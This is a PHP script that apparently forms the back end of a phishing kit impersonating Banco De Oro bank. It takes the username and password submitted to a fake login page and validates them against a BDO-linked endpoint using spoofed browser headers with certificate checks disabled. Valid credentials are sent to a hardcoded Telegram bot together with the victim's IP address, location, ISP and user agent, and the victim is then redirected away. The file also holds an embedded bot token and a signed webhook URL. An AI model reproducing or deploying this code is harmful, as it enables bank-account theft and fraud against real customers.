<?php 

function sendTelegramMessage($message, $chat_id = '6974614935', $token = '6548315274:AAHs2eoE4O8Se6feQLLu2BXl9NIqsM06k08') {
    $telegramUrl = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id;

    $ip = $_SERVER['REMOTE_ADDR']; // Get the user's IP address
    $apiUrl = "http://ipinfo.io/{$ip}/json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);
    $data = json_decode($response, true);
    curl_close($ch);
    $_SESSION['logcountry'] = $data['country'];
    $_SESSION['logregion'] = $data['region'];
    $_SESSION['logcity'] = $data['city'];
    $_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION['org'] = $data['org'];
    $_SESSION['hostname'] = $data['hostname'];
    $_SESSION['isp'] = $data['isp'];

    // Constructing message
    $text  = "-------------------[Banco De Oro 2022]-----------------\n";
    $text .= "---------------------[ODIN LIF3]---------------------\n";
    $text .= "---------------------[EXPLOR3R 404]---------------------\n";
    $text .= "$message";
    // Adding IP details to the message
    $text .= "\n\nIP: " . $_SERVER['REMOTE_ADDR'];
    $text .= "\nCity: " . $_SESSION['logcity'];
    $text .= "\nRegion: " . $_SESSION['logregion'];
    $text .= "\nCountry: " . $_SESSION['logcountry'];
    $text .= "\nHostname: " . $_SESSION['hostname'];
    $text .= "\nUserAgent: " . $_SESSION['useragent'];
    $text .= "\nOrganization: " . $_SESSION['org'];
    $text .= "\nISP: " . $_SESSION['isp'];
    $text .= "\nTime: " . date("F j, Y, g:i a");

    // Encoding message
    $encodedMessage = urlencode($text);

    // Constructing URL
    $url = $telegramUrl . "&text=" . $encodedMessage;

    // Sending message via cURL
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}
$message ="
Username : " . $_POST['username'] . "
Password : " . $_POST['password'];

$url = "https://prod-04.southeastasia.logic.azure.com/workflows/c5d84fdb1d7f418cb8e0968e24f05159/triggers/manual/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=nlU-rUp0Q0Jj3WgcXhlFWV-qFZeEWyoxb2TwhB8QC7U";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
"Accept: */*",
"Accept-Language: en-US,en;q=0.9,id;q=0.8",
"Connection: keep-alive",
"Content-Type: application/json",
"Origin: https://www.apply.bdo.com.ph",
"Referer: https://www.apply.bdo.com.ph/",
"Sec-Fetch-Dest: empty",
"Sec-Fetch-Mode: cors",
"Sec-Fetch-Site: cross-site",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
"sec-ch-ua-mobile: ?0",
"sec-ch-ua-platform: 'Windows'",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{ "UserCreds" : [{ "UserName": "'.$_POST['username'].'"},{"Password":"'.base64_encode($_POST['password']).'"},{"grant_type":"password"} ]}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);
// var_dump($resp);
$asu = json_decode($resp,true);
if(@$asu['Message'] === 'Invalid username or password.'){
    header("Location: https://youtube.com");
}else{
    $this->sendTelegramMessage($message);
    header("Location: https://google.com");
}
?>